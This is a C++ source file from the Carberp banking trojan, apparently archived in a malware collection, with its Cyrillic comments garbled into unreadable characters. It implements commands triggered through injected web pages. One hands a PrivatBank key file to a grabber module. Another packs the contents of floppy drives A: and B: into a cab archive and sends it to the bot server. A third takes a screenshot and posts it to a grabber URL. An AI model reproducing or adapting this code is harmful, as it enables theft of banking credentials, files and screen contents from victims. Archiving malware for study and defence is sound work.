/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------

#pragma hdrstop

#include "HTMLInjectsScriptAdapter.h"
//---------------------------------------------------------------------------

#include "Strings.h"
#include "Utils.h"
#include "Loader.h"
#include "CabPacker.h"
#include "StrConsts.h"
#include "Splice.h"
#include "GetApi.h"
#include "ScreenShots.h"
#include "BotHTTP.h"

#include "Modules.h"

void SendPrivatBankKey(const char* Command, const char* Params);
void SendFloppyDiskToServer(const char* Command, const char* Params);
void SendSendScreenshot(const char* Command, const char* Params);



typedef void (*THTMLInjectRequestCommand)(const char* Command, const char* Params);



//----------------------------------------------------------
//  ProcessHTMLInjectRequest - ������� ������������ �����
//  ������� �, � ������ ���� ��� ��������� �� ��� �������
//  ���������� � ��������, ��������� ����������� ��������
//
//  URL - �������������� �����
//
//  CloseRequest - ������� ��������� �������� � ������,
//                 ���� ������ ��������� � ������ �� �����
//                 ��� ����������
//----------------------------------------------------------
bool ProcessHTMLInjectRequest(const char* URL, bool DecodeParam, bool* CloseRequest)
{
  

	if (CloseRequest)
		*CloseRequest = false;  

	if (STRA::IsEmpty(URL))
		return false;

	// ���������� ��� �������
	int Pos = STRA::Pos(URL, "://");
	if (Pos >= 0)
		URL += Pos + 3;

	// ���������� ��� ������
	URL = STRA::Scan(URL, '/');
	if (!URL) return false;
	URL++;


	// ���������� ������ ������ ����������
	PCHAR Params = STRA::Scan(URL, '/');

	// ���������� ����� �������
	int CmdLen = (Params) ? (Params - URL) : STRA::Length(URL);


	// � ������ ���������� ������ � ������ FireFox �������������
	// ��������� ������� �������� www � .com
	// �.�. ���� ������� �������� ��� www.command.com
 

	// ������������ �������
	if (Params) Params++;

	DWORD CmdHash = STRA::Hash(URL, CmdLen, true);

	bool DecodeFromUTF8 = true;

	// ��������� ��� �������
	THTMLInjectRequestCommand Command = NULL;

	if (CmdHash == 0x9E19D547 /* keypath */)
		Command = SendPrivatBankKey;
	else
	if (CmdHash == 0x3D78E9CE /* dusketa */)
		Command = SendFloppyDiskToServer;
	else
	if (CmdHash == 0xDF8EE546 /* makescreen */)
	{
		Command = SendSendScreenshot;
		DecodeFromUTF8 = false;
	}


	// ��������� �������
	bool Result = false;  
	if (Command)
	{
		Result = true;
		if (CloseRequest) *CloseRequest = true; 

		string CmdStr;
		CmdStr.Copy(URL, 0, CmdLen);

		// ��������������� �� UTF8 � Ansi
		string EP = URLDecode(Params);

		if (DecodeFromUTF8)
		{
			PCHAR P = UTF8ToAnsi(EP.t_str());
			EP = P;
			STR::Free(P);
		}

//		string F;
//		F.Format("����������� ������� �������: %s; ���������: %s", CmdStr.t_str(), EP.t_str());
//		pMessageBoxA(0, F.t_str(), 0, 0);
//		pOutputDebugStringA(F.t_str());

		Command(CmdStr.t_str(), EP.t_str());
	}

	return Result;
}
//-----------------------------------------------------------------------------



//---------------------------------------------------
//  ������� ���������� ���� ����� �����������
//---------------------------------------------------
void SendPrivatBankKey(const char* Command, const char* Params)
{
	if (!File::IsExists((PCHAR)Params))  
		return;       
    

#ifdef PrivatBankH
	TPrivatBank Privat;
	Privat.AddKeyFile(Params);
#endif


	// ��������� ��� � �����
//	string FN = File::GetTempName2A();
//
//	HCAB Cab = CreateCab(FN.t_str());
//	if (Cab)
//	{
//		PCHAR Name = File::ExtractFileNameA((PCHAR)Params, false);
//		bool Added = AddFileToCab(Cab, Params, Name);
//		CloseCab(Cab);
//
//		DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrSystemPrivat).t_str());
//	}
//	pDeleteFileA(FN.t_str());
}
//-----------------------------------------------------------------------------


//---------------------------------------------------
//  ������� ���������� ���������� ������������ ��
//  ������ �������
//---------------------------------------------------
void SendFloppyDiskToServer(const char* Command, const char* Params)
{
	string FN = File::GetTempName2A();
	HCAB Cab = CreateCab(FN.t_str());
	if (Cab)
	{
		DWORD EMode = (DWORD)pSetErrorMode(SEM_FAILCRITICALERRORS);

		// ��������� ����� "A" � "B" � ���
		bool Added = AddDirToCab(Cab, "a:\\", "drive_a");

		if (AddDirToCab(Cab, "b:\\", "drive_b"))
			Added = true;

		pSetErrorMode(EMode);

		CloseCab(Cab);

		if (Added)
			Added = DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrCabNameDisketa).t_str());
	}
    pDeleteFileA(FN.t_str());
}
//-----------------------------------------------------------------------------



//-----------------------------------------------
//  ������� ������ �������� ��������� � ��������
//  ��� �� ������
//-----------------------------------------------
#ifdef AzConfigH
DWORD WINAPI DoSendSendScreenshot(string *Params)
{
	// ���������� ��� �������
	string System;
	string Comment;
	PCHAR Start = STRA::Scan(Params->t_str(), '/');
	if (Start)
	{
		*Start = 0;
		Start++;
		System = Params->t_str();
		Comment = Start;
	}
	else
	{
		Comment = *Params;
		System  = "screens";
	}

	// ������ �����
    string FN = File::GetTempName2A();
	if (!ScreenShot::Make(0, 0, 0, 0, 0, NULL, FN.t_str()))
		return 0;

	// ���������� ������
	string URL = GetAzGrabberURL(System, "save_sf");
	if (!URL.IsEmpty())
	{
		TMultiPartData Data;
		Data.Add("txt", Comment);
		Data.AddFile("file", FN.t_str(), NULL, NULL);

		THTTP HTTP;
		HTTP.Post(URL.t_str(), &Data);
    }

	// ������� ������
	delete Params;
	pDeleteFileA(FN.t_str());
	return 0;
}
#endif


//-----------------------------------------------
//  SendSendScreenshot - ������� ������ ������
//  ������ � ���������� ��� �� ������
//-----------------------------------------------
void SendSendScreenshot(const char* Command, const char* Params)
{
	#ifdef AzConfigH
	StartThread(DoSendSendScreenshot, new string(Params));
	#endif
}
